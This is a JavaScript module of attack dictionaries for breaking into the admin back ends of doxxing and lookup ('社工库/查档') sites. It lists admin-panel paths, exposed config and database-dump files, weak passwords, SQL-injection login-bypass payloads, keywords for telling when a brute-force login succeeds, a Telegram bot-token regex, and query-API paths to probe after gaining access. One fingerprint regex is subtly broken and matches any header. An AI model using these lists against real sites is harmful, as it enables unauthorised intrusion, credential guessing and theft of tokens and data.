'use strict';

// 社工库/查档类服务后台的常用字典。
// 这类站大多是现成源码二开（ThinkPHP / Laravel / 原生 PHP / SpringBoot），
// 后台路径、默认口令、暴露文件高度同质化，所以字典命中率很高。

// 后台 / 管理入口
const ADMIN_PATHS = [
  '/admin', '/admin/', '/admin.php', '/admin/login', '/admin/login.php',
  '/houtai', '/houtai.php', '/houtai/login.php', '/manage', '/manage.php',
  '/login', '/login.php', '/signin', '/index.php/admin', '/index.php?m=admin',
  '/?m=admin', '/admincp', '/admincp.php', '/system', '/system/login',
  '/webadmin', '/adm', '/adm.php', '/administrator', '/user/login',
  '/backend', '/backend/login', '/panel', '/console', '/dashboard',
  '/admin_index.php', '/admin_login.php', '/sgk', '/sgk/admin', '/query/admin',
];

// 敏感文件 / 泄露面
const EXPOSED_PATHS = [
  '/.env', '/.env.bak', '/.git/config', '/.git/HEAD', '/.svn/entries',
  '/config.php', '/config.php.bak', '/config/database.php', '/application/database.php',
  '/backup.sql', '/db.sql', '/data.sql', '/sql.sql', '/www.zip', '/wwwroot.zip',
  '/www.rar', '/backup.zip', '/1.sql', '/phpinfo.php', '/adminer.php',
  '/phpmyadmin', '/pma', '/mysql', '/dbadmin', '/install.php', '/install',
  '/actuator', '/actuator/env', '/actuator/beans', '/swagger-ui.html',
  '/api/swagger.json', '/v2/api-docs', '/robots.txt', '/.DS_Store',
];

// 子域前缀
const SUBDOMAIN_PREFIXES = [
  'admin', 'api', 'panel', 'houtai', 'manage', 'backend', 'back', 'system',
  'sgk', 'query', 'cha', 'chaxun', 'vip', 'pay', 'kami', 'user', 'uc',
  'www', 'm', 'app', 'bot', 'tg', 'test', 'dev', 'old', 'new', 'sql',
  'db', 'mysql', 'pma', 'phpmyadmin', 'cdn', 'oss', 'down', 'www2',
];

// 弱口令（按社工库/查档站的常见习惯排过序）
const WEAK_PASSWORDS = [
  'admin', '123456', 'admin123', 'admin888', 'admin123456', '888888', '666666',
  '123123', '123456789', '12345678', 'a123456', 'abc123', 'abcd1234', 'a123456789',
  '1q2w3e4r', 'qwerty', 'passw0rd', 'password', 'P@ssw0rd', 'Admin@123',
  'root', 'root123', 'toor', 'test', 'test123', '123456a', '5201314',
  'woaini1314', 'woaini520', 'a1b2c3', 'adminadmin', 'administrator',
  'sgk', 'sgk123', 'sgk888', 'houtai', 'houtai123', 'kami', 'kami888',
  'xiaohei', 'xiaohei666', 'cha', 'chaxun', 'nihao123', 'csdn', 'csdn123',
  'zxcvbnm', '1qaz2wsx', 'qazwsx', 'iloveyou', 'woaini',
];

// 后台登录的通用用户名
const COMMON_USERS = ['admin', 'administrator', 'root', 'sgk', 'houtai', 'test', 'user', 'superadmin', 'sysadmin', 'manager'];

// 登录框 SQL 注入万能口令
const SQLI_PAYLOADS = [
  "' or 1=1#", "' or 1=1-- ", "' or '1'='1", "' or '1'='1'#", "' or 'a'='a",
  "admin' or '1'='1", "admin' -- ", "admin'#", "admin') or ('1'='1",
  "') or ('1'='1", "1' or '1'='1' -- ", "' OR 1=1 --", "\" or \"1\"=\"1",
  "' union select 1,2,3#", "admin' or 1=1 limit 1#",
];

// 判定"登录成功"的正向特征
const SUCCESS_KEYWORDS = [
  'logout', 'sign out', '退出', '注销', '退出登录', '安全退出', '后台管理',
  'welcome', 'dashboard', '控制台', '管理首页', 'admin/index', 'admin_main',
  'userlist', '会员管理', '卡密管理', '充值', '余额', '查询记录',
];

// 判定"登录失败"的负向特征
const FAIL_KEYWORDS = [
  '密码错误', 'password error', 'incorrect', 'invalid', '用户名或密码',
  'login failed', '账号或密码', 'wrong password', 'bad credentials', '登录失败',
  '验证码', 'captcha', 'verify code',
];

// 常见登录表单字段名组合（按优先级尝试）
const LOGIN_FIELD_SETS = [
  { user: 'username', pass: 'password' },
  { user: 'user', pass: 'pass' },
  { user: 'name', pass: 'pwd' },
  { user: 'admin_name', pass: 'admin_pass' },
  { user: 'account', pass: 'password' },
  { user: 'username', pass: 'passwd' },
  { user: 'user_name', pass: 'password' },
  { user: 'email', pass: 'password' },
];

// 指纹特征
const FINGERPRINTS = [
  { name: 'ThinkPHP', test: (b, h) => /thinkphp|ThinkPHP/i.test(b) || /thinkphp/i.test(h) || / XPDEBUG |/i.test(h) },
  { name: 'Laravel', test: (b, h) => /laravel_session|XSRF-TOKEN/i.test(h) || /laravel/i.test(b) },
  { name: 'phpMyAdmin', test: (b) => /phpMyAdmin|pma_/i.test(b) },
  { name: 'SpringBoot', test: (b) => /Whitelabel Error Page|Spring Boot/i.test(b) },
  { name: 'Discuz', test: (b) => /Discuz|discuz_uid/i.test(b) },
  { name: 'WordPress', test: (b) => /wp-content|wp-includes/i.test(b) },
  { name: 'Jeecg/JFinal', test: (b) => /jeecg|jfinal/i.test(b) },
  { name: 'FastAdmin', test: (b) => /fastadmin|FastAdmin/i.test(b) },
];

// Telegram Bot Token
const BOT_TOKEN_RE = /\b(\d{8,10}):([A-Za-z0-9_-]{35})\b/g;

// 常见"查询接口"路径（拿到后台后直接在里面找，或盲打）
const QUERY_API_PATHS = [
  '/api/query', '/api/search', '/api/lookup', '/api/user/query', '/api/getInfo',
  '/api/v1/query', '/api/v1/search', '/index.php/api/query', '/api.php',
  '/query', '/search', '/api/index/query', '/api/data/query', '/api/sgk/query',
];

module.exports = {
  ADMIN_PATHS, EXPOSED_PATHS, SUBDOMAIN_PREFIXES, WEAK_PASSWORDS, COMMON_USERS,
  SQLI_PAYLOADS, SUCCESS_KEYWORDS, FAIL_KEYWORDS, LOGIN_FIELD_SETS,
  FINGERPRINTS, BOT_TOKEN_RE, QUERY_API_PATHS,
};
